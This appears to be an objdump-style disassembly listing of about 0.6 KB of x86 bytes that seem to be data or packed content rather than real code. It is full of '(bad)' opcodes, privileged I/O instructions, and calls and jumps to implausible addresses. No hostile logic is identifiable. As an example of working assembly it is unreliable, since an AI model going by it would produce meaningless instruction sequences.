  4bfc6f:	jns    0x4bfc5c
  4bfc71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bfc72:	mov    edi,cr0
  4bfc75:	push   ss
  4bfc76:	jbe    0x4bfc58
  4bfc78:	jecxz  0x4bfc12
  4bfc7a:	ficom  WORD PTR [ecx-0x71]
  4bfc7d:	xchg   ebp,eax
  4bfc7e:	lock scas al,BYTE PTR es:[edi]
  4bfc80:	stos   BYTE PTR es:[edi],al
  4bfc81:	xchg   eax,edx
  4bfc83:	test   BYTE PTR [esp+edi*1+0x28],dl
  4bfc87:	pop    DWORD PTR [eax-0x30]
  4bfc8a:	or     DWORD PTR [edx],0x1f
  4bfc8d:	(bad)  
  4bfc8e:	out    dx,eax
  4bfc8f:	inc    edx
  4bfc90:	mov    esi,0xcd4136f7
  4bfc95:	jnp    0x4bfc6a
  4bfc97:	push   eax
  4bfc98:	ins    DWORD PTR es:[edi],dx
  4bfc99:	pop    edx
  4bfc9a:	inc    ebp
  4bfc9b:	loopne 0x4bfcbf
  4bfc9d:	pop    ecx
  4bfc9e:	xor    ebx,DWORD PTR [esi]
  4bfca0:	je     0x4bfc49
  4bfca2:	bnd jns 0x4bfd0b
  4bfca5:	adc    al,0x6f
  4bfca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4bfca8:	xchg   ebp,eax
  4bfca9:	fs pop eax
  4bfcab:	dec    eax
  4bfcac:	call   0x9d9b38f3
  4bfcb1:	out    dx,eax
  4bfcb2:	and    eax,0x8e0c644f
  4bfcb7:	aad    0x7a
  4bfcb9:	test   BYTE PTR [esi],bl
  4bfcbb:	test   DWORD PTR [edx-0x13c4e96b],0xa30789bb
  4bfcc5:	xor    BYTE PTR [ecx+0x7cb54b90],bh
  4bfccb:	daa    
  4bfccc:	pushf  
  4bfccd:	xchg   edi,eax
  4bfcce:	pop    es
  4bfccf:	or     esi,DWORD PTR [ecx]
  4bfcd1:	lea    ecx,[ebp+0x175ffe8a]
  4bfcd7:	xor    dh,BYTE PTR [ecx]
  4bfcd9:	or     DWORD PTR [ebp+ebx*1+0x55c31729],esp
  4bfce0:	jbe    0x4bfd47
  4bfce2:	mov    edi,ss
  4bfce4:	loop   0x4bfcc0
  4bfce6:	outs   dx,DWORD PTR ds:[esi]
  4bfce7:	int3   
  4bfce8:	and    al,0x2f
  4bfcea:	add    esp,DWORD PTR [eax]
  4bfcec:	mov    ebx,DWORD PTR [ecx]
  4bfcee:	(bad)  
  4bfcef:	jge    0x4bfd20
  4bfcf1:	inc    edx
  4bfcf2:	jb     0x4bfcdc
  4bfcf4:	aas    
  4bfcf5:	ja     0x4bfd37
  4bfcf7:	lods   eax,DWORD PTR ds:[esi]
  4bfcf8:	std    
  4bfcf9:	cdq    
  4bfcfa:	adc    cl,0x28
  4bfcfd:	in     eax,0xcb
  4bfcff:	cld    
  4bfd00:	test   ah,ch
  4bfd02:	mov    ds:0x1c030d0b,al
  4bfd07:	inc    ebp
  4bfd08:	add    al,0xe4
  4bfd0a:	pop    ebx
  4bfd0b:	jb     0x4bfcb5
  4bfd0d:	or     BYTE PTR [ebp+0x0],al
  4bfd10:	and    DWORD PTR [ecx],0x1d3506ae
  4bfd16:	dec    edi
  4bfd17:	popa   
  4bfd18:	mov    eax,0x11b2ae08
  4bfd1d:	imul   esi,ebx,0xffffffe6
  4bfd20:	popa   
  4bfd21:	xor    bh,ch
  4bfd23:	sub    DWORD PTR [edx+0x5c],ebx
  4bfd26:	xchg   DWORD PTR [ebp+0x4544eb54],esi
  4bfd2c:	and    DWORD PTR [edi+0x304c90a7],edx
  4bfd32:	jmp    0x4bfd55
  4bfd34:	ins    BYTE PTR es:[edi],dx
  4bfd35:	sub    BYTE PTR fs:[esi],bl
  4bfd38:	jb     0x4bfd5e
  4bfd3a:	pop    eax
  4bfd3b:	pushf  
  4bfd3c:	mov    ebp,0x2990b854
  4bfd41:	cwde   
  4bfd42:	pop    ss
  4bfd43:	mov    BYTE PTR gs:[ebx],bl
  4bfd46:	jge    0x4bfda8
  4bfd48:	test   eax,edi
  4bfd4a:	shr    ecx,1
  4bfd4c:	cmp    dl,0x8c
  4bfd4f:	call   0x9cada396
  4bfd54:	xor    esi,DWORD PTR [ebx]
  4bfd56:	neg    BYTE PTR [eax+0x65b75c2a]
  4bfd5c:	out    0xc1,al
  4bfd5e:	out    0xfc,al
  4bfd60:	fdiv   QWORD PTR [eax]
  4bfd62:	sub    BYTE PTR [eax-0x7],dh
  4bfd65:	lahf   
  4bfd66:	lods   al,BYTE PTR ds:[esi]
  4bfd67:	mov    eax,0x5484b4e2
  4bfd6c:	cmp    bl,cl
  4bfd6e:	dec    ecx
  4bfd6f:	inc    eax
  4bfd70:	mov    dh,0x38
  4bfd72:	push   ebp
  4bfd73:	inc    ecx
  4bfd74:	push   ebp
  4bfd75:	jae    0x4bfd4e
  4bfd77:	sub    eax,0x6a420afc
  4bfd7c:	push   eax
  4bfd7d:	shl    DWORD PTR [edi+0x1b341a06],cl
  4bfd83:	in     al,dx
  4bfd84:	push   ss
  4bfd85:	xor    BYTE PTR [esi-0x6aaeb0b0],0x69
  4bfd8c:	mov    DWORD PTR [edx+0x19],esi
  4bfd8f:	add    BYTE PTR [ecx+eax*1+0x0],ah
  4bfd93:	ret    
  4bfd94:	adc    al,0x42
  4bfd96:	xor    dl,BYTE PTR [ecx+0x1]
  4bfd99:	mov    esi,0xdbdd7c24
  4bfd9e:	mov    ebx,ecx
  4bfda0:	push   esi
  4bfda1:	xor    eax,DWORD PTR [edx+0x5]
  4bfda4:	nop
  4bfda5:	lock lahf 
  4bfda7:	sti    
  4bfda8:	sbb    al,0x4c
  4bfdaa:	and    dl,dl
  4bfdac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4bfdad:	fwait
  4bfdae:	(bad)  
  4bfdaf:	push   ebx
  4bfdb0:	mov    eax,0xb88d0070
  4bfdb5:	retf   0x36bf
  4bfdb8:	or     eax,0x3c73b454
  4bfdbd:	sub    ebx,DWORD PTR [ebp-0x14]
  4bfdc0:	jmp    0x4bfd66
  4bfdc2:	jo     0x4bfdf0
  4bfdc4:	or     DWORD PTR [edi],edx
  4bfdc6:	cmp    bh,bh
  4bfdc8:	mov    ah,0x4d
  4bfdca:	out    dx,eax
  4bfdcb:	xor    al,BYTE PTR [edi]
  4bfdcd:	jge    0x4bfdc7
  4bfdcf:	sub    edi,DWORD PTR [ebp-0x10]
  4bfdd2:	mov    edx,0xd1001c00
  4bfdd7:	xchg   ecx,eax
  4bfdd8:	add    al,al
  4bfdda:	adc    BYTE PTR [ecx+ecx*4-0x3],al
  4bfdde:	push   ecx
  4bfddf:	ficom  DWORD PTR [ebx-0x3e]
  4bfde2:	xchg   DWORD PTR [ebp+0xc],ecx
  4bfde5:	dec    esp
  4bfde6:	call   0x8a897d9
  4bfdeb:	dec    ecx
  4bfdec:	ss fs test eax,0xe152b6b6
  4bfdf3:	sahf   
  4bfdf4:	mov    es,WORD PTR [edi]
  4bfdf6:	or     BYTE PTR [eax+eax*2],bh
  4bfdf9:	sub    DWORD PTR [ecx-0x48],esp
  4bfdfc:	xchg   ecx,eax
  4bfdfd:	fbstp  TBYTE PTR [edx-0x5729ec9]
  4bfe03:	xchg   esp,eax
  4bfe04:	test   eax,0x3556b56
  4bfe09:	mov    edi,0x84071139
  4bfe0e:	or     ecx,ecx
  4bfe10:	pop    ds
  4bfe11:	sbb    eax,0x8ff05f96
  4bfe16:	ins    BYTE PTR es:[edi],dx
  4bfe17:	mov    ch,0xa1
  4bfe19:	mov    eax,DWORD PTR [edi+0x52f055c7]
  4bfe1f:	push   eax
  4bfe20:	and    ecx,esp
  4bfe22:	add    DWORD PTR [esp+eax*1+0x1a8029a4],esi
  4bfe29:	pop    eax
  4bfe2a:	sub    eax,0x915210d3
  4bfe2f:	test   al,0x5b
  4bfe31:	scas   eax,DWORD PTR es:[edi]
  4bfe32:	sbb    DWORD PTR [eax],0x5f978880
  4bfe38:	dec    esp
  4bfe39:	ror    BYTE PTR [ebx-0x55],cl
  4bfe3c:	xor    eax,0x90f8bdb0
  4bfe41:	sub    BYTE PTR [ebp+0x521b6d95],al
  4bfe47:	dec    eax
  4bfe48:	xor    DWORD PTR [ecx+0x61],eax
  4bfe4b:	inc    esi
  4bfe4c:	pusha  
  4bfe4d:	pop    ss
  4bfe4e:	mov    ?,WORD PTR [ebx]
  4bfe50:	xchg   DWORD PTR [ebx+0x7b],edx
  4bfe53:	adc    eax,0x705ed0a1
  4bfe58:	and    al,0xfb
  4bfe5a:	daa    
  4bfe5b:	mov    al,ds:0x7561202
  4bfe60:	daa    
  4bfe61:	scas   eax,DWORD PTR es:[edi]
  4bfe62:	cwde   
  4bfe63:	call   0x91455db9
  4bfe68:	mov    BYTE PTR [ebp-0x4],0x0
  4bfe6c:	je     0x4bfeb7
  4bfe6e:	xor    BYTE PTR [esi+0xac73a84],ah
  4bfe74:	pop    edx
  4bfe75:	leave  
  4bfe76:	movups XMMWORD PTR [eax],xmm2
  4bfe79:	data16 add al,0x1a
  4bfe7c:	adc    al,0xf0
  4bfe7e:	mov    edi,0x57cd521f
  4bfe83:	test   BYTE PTR [edx-0x7beeb5d0],ah
  4bfe89:	daa    
  4bfe8a:	ss pop esi
  4bfe8c:	push   esi
  4bfe8d:	push   ecx
  4bfe8e:	dec    eax
  4bfe8f:	loope  0x4bfe72
  4bfe91:	and    BYTE PTR [ecx+0x16],ch
  4bfe94:	cli    
  4bfe95:	push   ds
  4bfe96:	push   ebx
  4bfe97:	rol    DWORD PTR [ecx-0x78809ab8],0x29
  4bfe9e:	mov    WORD PTR [esi],?
  4bfea0:	pusha  
  4bfea1:	cmp    esi,0x64
  4bfea4:	and    DWORD PTR [eax+0x13],ecx
  4bfea7:	push   edx
  4bfea8:	inc    esi
  4bfea9:	push   edx
  4bfeaa:	dec    eax
  4bfeab:	jb     0x4bfea6
  4bfead:	(bad)  
  4bfeaf:	adc    al,0xa4
  4bfeb1:	add    BYTE PTR [esi],0x42
  4bfeb4:	stos   DWORD PTR es:[edi],eax
  4bfeb5:	mov    edx,DWORD PTR ds:0x21158424
  4bfebb:	mov    al,ds:0xeb196053
  4bfec0:	shr    DWORD PTR [ecx],1
  4bfec2:	xor    al,0x10
  4bfec4:	dec    esp
  4bfec5:	xchg   ebp,eax
  4bfec6:	imul   eax,DWORD PTR [edx+ebp*1],0x1e255b5f
  4bfecd:	and    al,0xea
  4bfecf:	dec    ebx
  4bfed0:	(bad)  
  4bfed1:	jmp    0x4bff28
  4bfed3:	inc    esi
  4bfed4:	xchg   esp,eax
  4bfed6:	mov    ds:0x17531b7,al
  4bfedb:	dec    ebx
  4bfedc:	popf   
  4bfedd:	push   esp
  4bfede:	nop
  4bfedf:	push   0xf21a0a79
  4bfee4:	aas    
  4bfee5:	add    bl,BYTE PTR [edx+0x7]
  4bfee8:	mov    ecx,DWORD PTR [esi+0x4ed010c]
  4bfeee:	xlat   BYTE PTR ds:[ebx]
  4bfeef:	or     ch,BYTE PTR [ebp+0x731074ed]
  4bfef5:	push   ss
  4bfef6:	inc    esi
  4bfef7:	enter  0x9c87,0x4e
  4bfefb:	inc    DWORD PTR [ecx]
  4bfefd:	test   BYTE PTR [esi-0x1e],ch
  4bff00:	pop    ebx
  4bff01:	xchg   esp,eax
  4bff02:	and    al,0x7
  4bff04:	fdiv   QWORD PTR [ecx+esi*4+0x704bf387]
  4bff0b:	inc    edi
  4bff0c:	dec    eax
  4bff0d:	add    eax,0xc17f3a36
  4bff12:	cmp    eax,0x7a9056e
  4bff17:	adc    al,0xf8
  4bff19:	xchg   DWORD PTR [eax-0x5f],edx
  4bff1c:	je     0x4bff9d
  4bff1e:	(bad)  [edi-0x26c26719]
  4bff24:	std    
  4bff25:	and    DWORD PTR [edi+0x5677486],ebx
  4bff2b:	imul   DWORD PTR [esi]
  4bff2d:	outs   dx,BYTE PTR ds:[esi]
  4bff2e:	or     bl,BYTE PTR [edi-0x2b86977e]
  4bff34:	mov    BYTE PTR [ebp-0x2eef353a],dl
  4bff3a:	cld    
  4bff3b:	shr    BYTE PTR [edx],1
  4bff3d:	xchg   DWORD PTR [ebp-0x79c88c36],ebx
  4bff43:	scas   eax,DWORD PTR es:[edi]
  4bff44:	bound  eax,QWORD PTR [eax-0x61e1ee41]
  4bff4a:	add    DWORD PTR [ecx+edi*4-0x27],esp
  4bff4e:	jne    0x4bffa2
  4bff50:	adc    DWORD PTR [eax],eax
  4bff52:	shl    DWORD PTR [eax-0x1337f497],0xeb
  4bff59:	cmp    al,0x40
  4bff5b:	xor    esi,eax
  4bff5d:	ds and ch,dh
  4bff60:	call   0xc7b288b6
  4bff65:	jnp    0x4bffd1
  4bff67:	pop    ecx
  4bff68:	xor    bl,bh
  4bff6a:	dec    esp
  4bff6b:	and    edx,DWORD PTR [ecx+0x50]
  4bff6e:	sub    bl,BYTE PTR [edx]
  4bff70:	adc    ah,cl
  4bff72:	mov    BYTE PTR es:[ebx],dl
  4bff75:	rcr    DWORD PTR [eax+0x5d4e6eca],0x50
  4bff7c:	pop    esp
  4bff7d:	pop    ebx
  4bff7e:	dec    ebp
  4bff7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4bff80:	ss pop esp
  4bff82:	inc    ebp
  4bff83:	test   BYTE PTR [edx+0x4e],ch
  4bff86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bff87:	dec    ecx
  4bff88:	push   0xd
  4bff8a:	imul   edx,DWORD PTR [ecx],0x26
  4bff8d:	xchg   edi,eax
  4bff8e:	add    eax,0x8ade439b
  4bff93:	ja     0x4bff6f
  4bff95:	cmp    al,0x88
  4bff97:	xor    al,0x8d
  4bff99:	jno    0x4bffdd
  4bff9b:	cmp    DWORD PTR [edx+0x50920c20],0x2f
  4bffa2:	xchg   dh,cl
  4bffa4:	adc    al,0x96
  4bffa6:	sar    BYTE PTR [ecx-0x43],0x6a
  4bffaa:	or     DWORD PTR [esi],edx
  4bffac:	test   al,0xd4
  4bffae:	adc    WORD PTR [edi+ecx*8+0x76437b50],si
  4bffb6:	(bad)  
  4bffb7:	cmp    DWORD PTR [esi+0x468aeb56],edi
  4bffbd:	push   es
  4bffbe:	xchg   BYTE PTR [edi],ah
  4bffc0:	lods   al,BYTE PTR ds:[esi]
  4bffc1:	adc    al,0xc2
  4bffc3:	imul   edi,DWORD PTR ds:0x808f4854,0xffffffbb
  4bffca:	test   BYTE PTR [ecx+eax*2],cl
  4bffcd:	pop    esp
  4bffce:	xor    eax,0x146eee44
  4bffd3:	nop
  4bffd4:	adc    BYTE PTR [esi],dl
  4bffd6:	xor    eax,0x4a44cbf
  4bffdb:	hlt    
  4bffdc:	mov    ch,0x54
  4bffde:	leave  
  4bffdf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4bffe0:	push   ecx
  4bffe1:	inc    eax
  4bffe2:	test   al,0xa7
  4bffe4:	or     ah,BYTE PTR [ebp+eiz*1+0x30]
  4bffe8:	sbb    edx,DWORD PTR [edx]
  4bffea:	push   eax
  4bffeb:	inc    ebp
  4bffec:	xor    DWORD PTR [ebx-0x10],ecx
  4bffef:	push   edi
  4bfff0:	es in  al,dx
  4bfff2:	je     0x4c0036
  4bfff4:	es mov eax,0x8cbf83e8
  4bfffa:	dec    esi
  4bfffb:	xor    dl,BYTE PTR [esi+eiz*8-0xae7cff1]
  4c0002:	jbe    0x4c0083
  4c0004:	mov    dl,al
  4c0006:	mov    eax,0x58c3f03
  4c000b:	and    eax,0x44a2a415
  4c0010:	adc    BYTE PTR [ecx-0x3b],dh
  4c0013:	nop
  4c0014:	sbb    ebx,DWORD PTR [ebx+eax*1-0x74]
  4c0018:	or     DWORD PTR [eax-0x75],esp
  4c001b:	cmp    eax,0x420a7466
  4c0020:	fld    QWORD PTR [esi]
  4c0022:	dec    ebx
  4c0023:	push   es
  4c0024:	jle    0x4c000b
  4c0026:	mov    ebp,ebp
  4c0028:	add    eax,esp
  4c002a:	and    esi,DWORD PTR [esi+0x12]
  4c002d:	(bad)  
  4c002e:	xlat   BYTE PTR ds:[ebx]
  4c002f:	repnz adc al,0x82
  4c0032:	xchg   ebx,eax
  4c0033:	popa   
  4c0034:	xor    al,0x2c
  4c0036:	add    BYTE PTR [eax+0x4f],dl
  4c0039:	mov    al,ds:0x409a26d4
  4c003e:	adc    BYTE PTR [edi-0x2f],dh
  4c0041:	and    BYTE PTR [edx],bl
  4c0043:	mov    DWORD PTR [ebp-0x7d],ebp
  4c0046:	ss jno 0x4c0009
  4c0049:	(bad)  
  4c004a:	scas   al,BYTE PTR es:[edi]
  4c004b:	mov    eax,ds:0x2ae0e00b
  4c0050:	pop    ds
  4c0051:	add    al,0x8d
  4c0053:	push   ecx
  4c0054:	call   esi
  4c0056:	lea    edx,[edx+0x486080f7]
  4c005c:	fld    DWORD PTR [ebx-0x22fc74a4]
  4c0062:	aaa    
  4c0063:	add    BYTE PTR [edi],0x99
  4c0066:	push   eax
  4c0067:	xchg   ecx,eax
  4c0068:	dec    ecx
  4c0069:	push   0xaeb24bdd
  4c006e:	mov    ah,0x82
  4c0070:	xor    al,0x10
  4c0072:	pop    esp
  4c0073:	push   ss
  4c0074:	pop    esp
  4c0075:	inc    ebx
  4c0076:	or     al,0x3d
  4c0078:	mov    eax,0xb446d384
  4c007d:	sbb    cl,BYTE PTR [esi-0x4a]
  4c0080:	sti    
  4c0081:	mov    al,0xa0
  4c0083:	sbb    eax,0xf8f8b930
  4c0088:	mov    es,WORD PTR [edi+0xa808391]
  4c008e:	adc    eax,0x5e3dbe7
  4c0093:	inc    eax
  4c0094:	mov    ebx,0x874c00d4
  4c0099:	daa    
  4c009a:	or     BYTE PTR fs:0xd097951b,0x85
  4c00a2:	ror    BYTE PTR [ebx],0x5c
  4c00a5:	mov    ds:0xaf57d20e,al
  4c00aa:	sahf   
  4c00ab:	inc    ebx
  4c00ac:	lods   al,BYTE PTR ds:[esi]
  4c00ad:	lea    edx,[eax]
  4c00af:	pop    edi
  4c00b0:	sub    cl,BYTE PTR [ebp+0xd0441d1]
  4c00b6:	out    0x46,eax
  4c00b8:	mov    bh,0xa1
  4c00ba:	mov    eax,ds:0x49146d96
  4c00bf:	test   al,dl
  4c00c1:	and    BYTE PTR [eax+0x71402066],0x70
  4c00c8:	sbb    al,0x98
  4c00ca:	and    esp,esi
  4c00cc:	(bad)  
  4c00cd:	in     eax,dx
  4c00ce:	arpl   WORD PTR [ecx+esi*8+0x7a83857b],ax
  4c00d5:	and    al,0xf0
  4c00d7:	xchg   BYTE PTR [ecx],cl
  4c00d9:	ins    DWORD PTR es:[edi],dx
  4c00da:	dec    esp
  4c00db:	add    DWORD PTR [ebx],esi
  4c00dd:	xor    eax,0xd41afd6c
  4c00e2:	mov    bh,0xbd
  4c00e4:	jp     0x4c0106
  4c00e6:	push   ecx
  4c00e7:	mov    esi,0x42022870
  4c00ec:	loope  0x4c00a1
  4c00ee:	fs test al,0xbb
  4c00f1:	fstp   DWORD PTR [edi+ebx*1-0x46]
  4c00f5:	xchg   ecx,eax
  4c00f6:	nop
  4c00f7:	mov    BYTE PTR ds:0xc5432180,dl
  4c00fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4c00fe:	fiadd  WORD PTR [ecx]
  4c0100:	or     ch,BYTE PTR [eax+0x68]
  4c0103:	jmp    0x4b4:0xe9303647
  4c010a:	xchg   ebx,eax
  4c010b:	adc    BYTE PTR [ecx+0x64],cl
  4c010e:	fsubr  QWORD PTR [esi-0x4edb9e07]
  4c0114:	mov    ds:0x21a12090,al
  4c0119:	jb     0x4c00be
  4c011b:	sar    esp,cl
  4c011d:	push   0xfffffff0
  4c011f:	push   0xfffffff8
  4c0121:	push   esi
  4c0122:	push   eax
  4c0123:	xchg   esp,eax
  4c0124:	jp     0x4c0189
  4c0126:	outs   dx,DWORD PTR ds:[esi]
  4c0127:	sub    eax,0x94edc87d
  4c012c:	push   es
  4c012d:	xor    al,0x2
  4c012f:	cmp    al,0x61
  4c0131:	mov    eax,0xe5ed0f8d
  4c0136:	sub    esp,DWORD PTR [ecx+0x6c]
  4c0139:	loope  0x4c0174
  4c013b:	sub    BYTE PTR [edi-0x39ee73d0],bh
  4c0141:	fidivr DWORD PTR [ebx+esi*1]
  4c0144:	ffreep st(0)
  4c0146:	or     BYTE PTR [ebx+0x2d],ah
  4c0149:	push   0xffffffe3
  4c014b:	mov    eax,ds:0x13c68913
  4c0150:	cmp    al,0xf6
  4c0152:	xor    al,0xa3
  4c0154:	jg     0x4c00d6
  4c0156:	stc    
  4c0157:	inc    ebx
  4c0158:	and    al,0x8b
  4c015a:	push   cs
  4c015b:	add    esi,edx
  4c015d:	cwde   
  4c015e:	ret    
  4c015f:	cmp    BYTE PTR [eax-0x12],bh
  4c0162:	leave  
  4c0163:	lods   eax,DWORD PTR ds:[esi]
  4c0164:	push   ebp
  4c0165:	mov    ch,0xa1
  4c0167:	loop   0x4c0186
  4c0169:	xchg   ebp,eax
  4c016a:	adc    eax,0xac86f432
  4c016f:	add    esp,DWORD PTR [ecx]
  4c0171:	jecxz  0x4c01bc
  4c0173:	push   0xffffffb5
  4c0175:	sti    
  4c0176:	add    ecx,esp
  4c0178:	adc    BYTE PTR [edx],0x8d
  4c017b:	fist   WORD PTR [ecx+0x6267a4a6]
  4c0181:	adc    al,0x26
  4c0183:	dec    edi
  4c0184:	or     al,0xb
  4c0186:	jmp    0x4899:0xb655926
  4c018d:	stos   BYTE PTR es:[edi],al
  4c018e:	popf   
  4c018f:	add    esi,esi
  4c0191:	cmp    dl,ch
  4c0193:	push   edx
  4c0194:	(bad)  
  4c0195:	sbb    DWORD PTR [eax+0x7606d540],esp
  4c019b:	arpl   WORD PTR [eax],bx
  4c019d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4c019e:	inc    edx
  4c019f:	inc    ebx
  4c01a0:	mov    al,BYTE PTR [eax-0x12c7f9f]
  4c01a6:	jnp    0x4c01b8
  4c01a8:	jb     0x118831ea
  4c01ae:	jbe    0x4c0225
  4c01b0:	cmp    al,0x13
  4c01b2:	shl    BYTE PTR [eax],0x27
  4c01b5:	xchg   ebp,eax
  4c01b6:	arpl   WORD PTR [edi+0x39f7fdef],sp
  4c01bc:	cmp    al,0xb4
  4c01be:	xchg   esp,edx
  4c01c0:	sub    BYTE PTR [esi+eax*8+0x12],al
  4c01c4:	mov    ebx,0x26530fa2
  4c01c9:	cs jmp 0x94d0e0e7
  4c01cf:	retf   
  4c01d0:	add    ah,bh
  4c01d2:	js     0x4c0209
  4c01d4:	inc    esp
  4c01d5:	into   
  4c01d6:	xchg   esp,eax
  4c01d7:	inc    edi
  4c01d8:	push   ds
  4c01d9:	dec    ebx
  4c01da:	adc    BYTE PTR [ecx+eax*8],bl
  4c01dd:	and    eax,0xd64d6dc0
  4c01e2:	test   BYTE PTR [edx],0xe
  4c01e5:	pop    edx
  4c01e6:	sar    bl,cl
  4c01e8:	mov    edx,0x4b3d34b0
  4c01ed:	jne    0x4c01b1
  4c01ef:	push   ecx
  4c01f0:	push   ss
  4c01f1:	mov    al,0x6d
  4c01f3:	ss xor ecx,ebx
  4c01f6:	mov    al,ds:0x3bfa593a
  4c01fb:	mov    cl,0x13
  4c01fd:	adc    edi,DWORD PTR [ebp+0x52df83d4]
  4c0203:	sub    ah,BYTE PTR [edi-0x1f18b86c]
  4c0209:	jne    0x4c0286
  4c020b:	or     ebx,DWORD PTR [esi]
  4c020d:	push   esp
  4c020e:	es push eax
  4c0210:	icebp  
  4c0211:	div    dh
  4c0213:	cmp    edx,DWORD PTR [ebp+0x6c0e0c51]
  4c0219:	add    al,dh
  4c021b:	(bad)  [eax]
  4c021d:	inc    esi
  4c021e:	pop    esi
  4c021f:	sub    ecx,DWORD PTR [ebp+0x7d]
  4c0222:	popf   
  4c0223:	fs lahf 
  4c0225:	in     eax,0x1e
  4c0227:	int3   
  4c0228:	lods   eax,DWORD PTR ds:[esi]
  4c0229:	mov    ebp,0x8234d0d6
  4c022e:	push   eax
  4c022f:	and    DWORD PTR [ecx-0x29],edx
  4c0232:	sbb    BYTE PTR [ecx+0x40],cl
  4c0235:	sbb    BYTE PTR [ecx+0x40415d2],ah
  4c023b:	bound  ebp,QWORD PTR [ebx+0x374fa98c]
  4c0241:	test   eax,0x5003fec8
  4c0246:	sub    al,0x58
  4c0248:	sub    eax,0x123d7993
  4c024d:	(bad)  
  4c024f:	fdivr  st(0),st
  4c0251:	push   0xb1ff57c3
  4c0256:	and    BYTE PTR [eax-0x43bb7d20],ch
  4c025c:	adc    BYTE PTR [ebx-0x6e],al
  4c025f:	sbb    eax,0xb0ff79ae
  4c0264:	cli    
  4c0265:	repz js 0x4c0209
  4c0268:	test   eax,0x7b7e6710
  4c026d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4c026e:	sub    bl,BYTE PTR [esi+0x0]
  4c0271:	std    
  4c0272:	je     0x4c0275
  4c0274:	add    edx,DWORD PTR [edi]
  4c0276:	xlat   BYTE PTR ds:[ebx]
  4c0277:	loope  0x4c02de
  4c0279:	xchg   DWORD PTR [eax-0x42],edx
  4c027c:	sbb    DWORD PTR [ecx+0x58345c21],edx
  4c0282:	test   BYTE PTR [ecx],dl
  4c0284:	xchg   DWORD PTR [eax+0x10],esi
  4c0287:	pop    ebx
  4c0288:	sbb    BYTE PTR [ebx],bl
  4c028a:	sbb    al,BYTE PTR [ebp-0x77e90bce]
  4c0290:	out    0x9,eax
  4c0292:	pushf  
  4c0293:	and    BYTE PTR [edx-0x80],ch
  4c0296:	inc    edi
  4c0297:	imul   edi,DWORD PTR [eax-0x33],0x3204de5a
  4c029e:	and    al,0x2f
  4c02a0:	lods   eax,DWORD PTR ds:[esi]
  4c02a1:	inc    ecx
  4c02a2:	jecxz  0x4c02ae
  4c02a4:	sbb    dl,BYTE PTR [edi]
  4c02a6:	mov    ebx,ecx
  4c02a8:	js     0x4c0258
  4c02aa:	sahf   
  4c02ab:	cdq    
  4c02ac:	(bad)  
  4c02ad:	stc    
  4c02ae:	pop    ss
  4c02af:	nop
  4c02b0:	daa    
  4c02b1:	lea    esp,[ebx-0x3b]
  4c02b4:	dec    edi
  4c02b5:	test   BYTE PTR [edi-0x14c0ff8c],al
  4c02bb:	addr16 in al,0x0
  4c02be:	fwait
  4c02bf:	adc    DWORD PTR [eax+ebp*1-0x7f79f4d0],edx
  4c02c6:	xchg   esp,eax
  4c02c7:	adc    eax,esi
  4c02c9:	gs push edi
  4c02cb:	or     DWORD PTR [edi],0x6913801b
  4c02d1:	push   edx
  4c02d2:	mov    bl,0x2e
  4c02d4:	mov    dl,0x25
  4c02d6:	dec    ecx
  4c02d7:	(bad)  [eax+0x1432558]
  4c02dd:	outs   dx,BYTE PTR ds:[esi]
  4c02de:	test   DWORD PTR [eax],ebp
  4c02e0:	pop    es
  4c02e1:	adc    DWORD PTR [eax-0x52],0xc1051499
  4c02e8:	sbb    BYTE PTR [eax-0x43],ch
  4c02eb:	(bad)  
  4c02ec:	shl    BYTE PTR [eax],0x52
  4c02ef:	xor    ah,BYTE PTR [eax]
  4c02f1:	jne    0x4c0344
  4c02f3:	loopne 0x4c02d5
  4c02f5:	jecxz  0x4c028a
  4c02f7:	arpl   WORD PTR [ebx],ax
  4c02f9:	or     bl,bl
  4c02fb:	sub    BYTE PTR [edx],dh
  4c02fd:	add    DWORD PTR [ebp+ebx*8+0x82cc3f8],eax
  4c0304:	fldenv [eax]
  4c0306:	mul    DWORD PTR [esi+0x69b87617]
  4c030c:	adc    esi,DWORD PTR [ecx+ecx*1+0x8]
  4c0310:	loop   0x4c02d0
  4c0312:	loop   0x4c0343
  4c0314:	sbb    BYTE PTR [edi+0x3d],dh
  4c0317:	dec    ebx
  4c0318:	or     al,0x49
  4c031a:	mov    bh,0x81
  4c031c:	jmp    0x4bb5ff0e
  4c0321:	jp     0x4c034d
  4c0323:	test   al,0x81
  4c0325:	js     0x4c036b
  4c0327:	and    bh,dh
  4c0329:	mov    al,bh
  4c032b:	adc    esi,DWORD PTR [ecx+0xc]
  4c032e:	cmp    bh,al
  4c0330:	jne    0x4c0337
  4c0332:	jge    0x4c037f
  4c0334:	sub    al,0xe1
  4c0336:	push   ecx
  4c0337:	rol    edx,cl
  4c0339:	retf   
  4c033a:	inc    ecx
  4c033b:	pop    ebp
  4c033c:	ins    BYTE PTR es:[edi],dx
  4c033d:	add    al,0xb7
  4c033f:	es pushf 
  4c0341:	dec    ecx
  4c0342:	jge    0x4c039e
  4c0344:	xor    dh,dl
  4c0346:	cmp    eax,0x50c23d00
  4c034b:	ins    BYTE PTR es:[edi],dx
  4c034c:	push   eax
  4c034d:	repnz (bad) 
  4c034f:	sub    DWORD PTR [edx],edi
  4c0351:	or     dl,BYTE PTR [ecx]
  4c0353:	xchg   ebp,eax
  4c0354:	je     0x4c0368
  4c0356:	stc    
  4c0357:	cmp    BYTE PTR [eax-0x52c40a7e],0x14
  4c035e:	into   
  4c035f:	inc    eax
  4c0360:	and    ecx,DWORD PTR [ebx+0x6da85740]
  4c0366:	hlt    
  4c0367:	xchg   ecx,eax
  4c0368:	or     DWORD PTR [ecx+ebp*8],ebx
  4c036b:	or     al,0x97
  4c036d:	imul   ecx,DWORD PTR [esp+eiz*4-0x7f706f4f],0xadd093d6
  4c0378:	push   es
  4c0379:	mov    WORD PTR [edi+edx*1],fs
  4c037c:	dec    ecx
  4c037d:	xor    al,0x17
  4c037f:	mov    esp,0xbc7d3442
  4c0384:	pop    ds
  4c0385:	xor    DWORD PTR [edi],eax
